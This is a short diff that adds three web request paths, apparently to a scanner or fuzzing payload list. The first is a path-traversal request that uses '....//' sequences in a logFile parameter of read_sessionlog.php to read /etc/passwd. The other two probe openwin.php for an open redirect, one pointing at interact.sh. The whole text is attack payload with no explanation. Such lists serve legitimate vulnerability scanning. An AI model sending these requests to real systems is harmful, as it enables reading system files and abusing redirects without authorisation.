@@ -1,0 +1,3 @@
+/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd
+/openwin.php?redirurl=http%3A%2F%2Fwww.example.com
+/openwin.php?redirurl=http://interact.sh
